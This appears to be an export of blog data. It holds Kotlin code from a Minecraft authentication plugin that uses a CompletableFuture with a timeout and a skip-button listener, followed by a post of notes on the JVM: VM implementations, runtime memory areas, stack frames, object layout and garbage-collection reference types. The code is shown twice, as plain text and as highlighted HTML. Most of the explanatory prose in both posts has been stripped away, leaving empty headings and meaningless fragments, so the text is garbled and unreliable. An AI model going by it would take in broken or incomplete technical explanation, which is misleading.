}\n        // \n        fun end() {\n            player.removeMetadata(\"SacredAuth:icon-display\", SacredAuth.plugin)\n            KetherShell.eval(conf.getString(\"auth.display.script.after-display\")!!) {\n                sender = player\n            }\n        }\n        future.thenRun {\n            end()\n            func.invoke()\n        }\n        val listener = AskSkipOrNot(player.uniqueId, future)\n        Bukkit.getPluginManager().registerEvents(listener, SacredAuth.plugin)\n        Tasks.task(true) {\n            try {\n                future.get(time * 50L, TimeUnit.MILLISECONDS)\n            } catch (ignored: TimeoutException) {\n                // futurefuturecomplete\n                // future.complete(true)\n                end()\n                func.invoke()\n            }\n        }\n    }\n```\n\n","slug":"try-completablefuture","published":1,"updated":"2022-12-12T15:54:04.090Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtx002nsfkl1shb8n78","content":"<p>(<a href=\"https://izzel.io/2020/02/12/chat-with-future/\"> | IzzelAlizs Blog</a>)</p>\n<p><strong></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p></p>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">,</span>\n                   <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> future<span class=\"token operator\">:</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> Listener <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerInteractEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"RIGHT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>RIGHT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"LEFT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>LEFT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerSwapHandItemsEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"F\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// </span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">toIconDisplayAnimation</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    player<span class=\"token punctuation\">.</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FixedMetadataValue</span><span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> future <span class=\"token operator\">=</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> time <span class=\"token operator\">=</span> conf<span class=\"token punctuation\">.</span><span class=\"token function\">getLong</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.time\"</span><span class=\"token punctuation\">)</span>\n    KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        sender <span class=\"token operator\">=</span> player\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        player<span class=\"token punctuation\">.</span><span class=\"token function\">removeMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n        KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.after-display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            sender <span class=\"token operator\">=</span> player\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    future<span class=\"token punctuation\">.</span><span class=\"token function\">thenRun</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">val</span> listener <span class=\"token operator\">=</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">.</span>uniqueId<span class=\"token punctuation\">,</span> future<span class=\"token punctuation\">)</span>\n    Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getPluginManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">registerEvents</span><span class=\"token punctuation\">(</span>listener<span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n    Tasks<span class=\"token punctuation\">.</span><span class=\"token function\">task</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>time <span class=\"token operator\">*</span> <span class=\"token number\">50L</span><span class=\"token punctuation\">,</span> TimeUnit<span class=\"token punctuation\">.</span>MILLISECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>ignored<span class=\"token operator\">:</span> TimeoutException<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// futurefuturecomplete</span>\n            <span class=\"token comment\">// future.complete(true)</span>\n            <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<p>(<a href=\"https://izzel.io/2020/02/12/chat-with-future/\"> | IzzelAlizs Blog</a>)</p>\n<p><strong></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p></p>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">,</span>\n                   <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> future<span class=\"token operator\">:</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> Listener <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerInteractEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"RIGHT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>RIGHT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"LEFT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>LEFT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerSwapHandItemsEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"F\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// </span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">toIconDisplayAnimation</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    player<span class=\"token punctuation\">.</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FixedMetadataValue</span><span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> future <span class=\"token operator\">=</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> time <span class=\"token operator\">=</span> conf<span class=\"token punctuation\">.</span><span class=\"token function\">getLong</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.time\"</span><span class=\"token punctuation\">)</span>\n    KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        sender <span class=\"token operator\">=</span> player\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        player<span class=\"token punctuation\">.</span><span class=\"token function\">removeMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n        KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.after-display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            sender <span class=\"token operator\">=</span> player\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    future<span class=\"token punctuation\">.</span><span class=\"token function\">thenRun</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">val</span> listener <span class=\"token operator\">=</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">.</span>uniqueId<span class=\"token punctuation\">,</span> future<span class=\"token punctuation\">)</span>\n    Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getPluginManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">registerEvents</span><span class=\"token punctuation\">(</span>listener<span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n    Tasks<span class=\"token punctuation\">.</span><span class=\"token function\">task</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>time <span class=\"token operator\">*</span> <span class=\"token number\">50L</span><span class=\"token punctuation\">,</span> TimeUnit<span class=\"token punctuation\">.</span>MILLISECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>ignored<span class=\"token operator\">:</span> TimeoutException<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// futurefuturecomplete</span>\n            <span class=\"token comment\">// future.complete(true)</span>\n            <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"JVM","date":"2022-07-30T16:00:00.000Z","author":"","hide":false,"summary":"","_content":"\n# JVM & Hook\n\n> \n\n## JVM\n\n**Java Virtual Machine**Java\n\n> Virtual Machine\n\nJVM****JavaAPIAPI****(native)nativejava\n\nJVMJVM`java -jar`jar, JVMJVM****jarMETA-INFmain\n\nJavaJVMJavaAPIJVM ***Write once, run anywhere***native(C, C++, Rust, Go...)JVM\n\n## JVM\n\n\n\n### Sun Classic VM\n\n> \n\nJava\n\n### HotSpot VM\n\n> \n\nJava\n\n### Graal VM\n\n> \n\nJVMJavaNode.jsExpress\n\n### Dalvik VM\n\n> Android\n\n> Dalvik[Google](https://baike.baidu.com/item/Google/86964)Android[](https://baike.baidu.com/item//104440)DalvikGoogleAndroid .dexDalvik ExecutableJava.dexDalvik[](https://baike.baidu.com/item//2844535)Dalvik Dalvik Linux \n>\n> DalvikIOS\n>\n> 2014625Android L I/OAndroid L [](https://baike.baidu.com/item//117920)DalvikART\n\n### ART\n\n> ART(Android Runtime)Android 4.4DalvikAndroid 4.4DVMARTAndroid 5.0ARTDVM\n\n**DalvikdexART**\n\n> DalvikdexJITdexdexJITDalvikART DalvikARTdexapkdex4.4ART\n\nART:\n\n- \n- \n- \n- \n\nART:\n\n- 10%-20%\n- \n\n> ARTGC\n\n// TODO \n\n## JDK8\n\njvmjvm\n\n// TODO\n\n## \n\nCC++/C++MMKVC++(JavaUnsafe/C++)\n\nJVMJVM/JVMJVM\n\n### \n\nJavaJava:\n\n![Java](http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png)\n\n#### \n\n****(), ****\n\nJava****)****\n\n**---Java & ---**\n\n\n\n> JavaCPU\n\n> ****CPUCPUCPU\n\n****: \n\n`Thread.sleep(long)`cpuJava\n\ncpu\n\ncpu`Thread#yield()`,****\n\ncpu\n\n> Thread#sleep\n>\n> \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t CPU\n\n`Thread.sleep()`\n\njava:)************\n\n![](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/20220708-161709.jpg)\n\n**------**\n\nJVMOOM\n\n> Java\n>\n> (undefined)\n\n#### \n\nJvmC/C++C++nativeJvmJVMvirtual machineC++JavaJVM\n\n, ****\n\n\n\n>\n>\n>```java\n>public class Main {\n>    public static void main(String[] args) {\n>        int res = a();\n>        System.out.println(res);\n>    }\n>\n>    public static int a(){\n>        return b();\n>    }\n>\n>    public static int b(){\n>        return c();\n>    }\n>\n>    public static int c(){\n>        int a = 10;\n>        int b = 20;\n>        return a + b;\n>    }\n>}\n>```\n>\n>`a() -> b() -> c() -> `\n>\n>`main`\n>\n>![image-20220131142625842](https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg)\n>\n>`a()``a()``main`\n>\n>![image-20220131143641690](https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg)\n>\n>abcc\n>\n>![image-20220131144209743](https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg)\n>\n>ca+bcc43432211\n>\n>![image-20220131144955668](https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg)\n\n****(StackOverFlowException)`-Xss size`vm options\n\n:\n\n\n\n- ****\n\n?\n\n- ****\n\n#### \n\n\n\n#### Java\n\nJava, GCJava\n\n#### \n\nJava****Java(Non-Heap)Java\n\nHotSpot VM\n\n> JIT\n>\n> jvm\n>\n> ![img](https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg)\n\n****\n\nJVMclass\n\n****Javac++`String#intern()`\n\n> String#intern\n>\n> String#intern\n>\n> java\n>\n> StringStringnew\n\n### \n\n#### \n\n##### \n\njvmnew\n\n##### \n\n- \n\n\tJava\n\n- \n\n\tJava\n\n****: \n\n- CAS\n- \n\n##### \n\nnull\n\n#####  (Object Header)\n\nJavahash code(`Object#hashCode()`)GC****\n\n##### \n\n`Unsafe#allocateInstance()`(GsonKtKtGson)\n\n#### \n\nHotSpot: (Header)(Instance Data)(Padding)\n\n: HashCodeGCID32643264bitMark World\n\n\n\nHotSpot88812\n\n#### \n\njava**reference**()Javareference********\n\n##### \n\n>  Javareference\n\nreferenceGCreference\n\n![20220708-221205](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png)\n\n##### \n\n> Javareference\n\njava**HotSpot**\n\n![20220708-221128](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png)\n\n###  (GC)\n\n\n\n####  & \n\nJava\n\n##### \n\n+1-10\n\nJava\n\n##### \n\nJavaC#******GC Roots******GC Roots****\n\nGC Roots:\n\n- \n-  Java\n-  \n- JNI\n- Java**Class**NullPointerException\n\n![](https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\n#### \n\nGCGCJDK1.2Java****\n\n##### \n\nGC\n\n##### \n\nGC`SoftReference`\n\n##### \n\nGC`WeakReference`\n\n##### \n\n`PhantomReference`\n\n#### \n\n##### 